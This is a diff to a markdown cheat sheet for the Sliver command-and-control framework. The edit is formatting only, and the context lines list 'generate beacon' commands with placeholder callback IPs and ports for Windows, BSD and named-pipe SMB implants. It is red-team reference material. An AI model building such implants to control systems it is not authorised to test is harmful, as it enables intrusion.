@@ -61,7 +61,7 @@ Flags:
 
 #### 4.1.2.1 - Syntax
 
-* Generate beacons
+Generate beacons
 
 ```
 sliver > generate beacon -a <architecture> -l -S <seconds> -m <IP>:<PORT> -o <platform> -f <format> -s /path/to/folder
@@ -73,13 +73,13 @@ sliver > generate beacon -a <architecture> -l -S <seconds> -b http[s]://<IP>:<PO
 
 #### 4.1.2.2 - Windows
 
-* Initial Foothold beacon
+Initial Foothold beacon
 
 ```
 sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | [386 | x86] | arm | arm64> -o windows -f <exe | service | shared | shellcode> -s /path/to/directory
 ```
 
-* Name-piped SMB beacon
+Name-piped SMB beacon
 
 ```
 sliver > generate beacon -n <IP>//./pipe/<name_pipe> -a <[amd64 | x64] | [386 | x86] | arm | arm64> -o windows -f <exe | service | shared | shellcode> -s /path/to/directory
@@ -99,19 +99,19 @@ sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm64> -o
 
 #### 4.1.2.5 - BSD
 
-* FreeBSD
+FreeBSD
 
 ```
 sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o freebsd -f exe -s /path/to/directory
 ```
 
-* NetBSD
+NetBSD
 
 ```
 sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o netbsd -f exe -s /path/to/directory
 ```
 
-* OpenBSD
+OpenBSD
 
 ```
 sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o openbsd -f exe -s /path/to/directory
@@ -199,7 +199,7 @@ Flags:
 
 #### 4.1.3.2 - Usage
 
-* Syntax
+Syntax usage to generate beacons.
 
 ```
 sliver > profiles new beacon -m <IP>:<PORT> -S 5 -J 10 -l -a <architecture> -o <platform> -f <format> <profile_name>
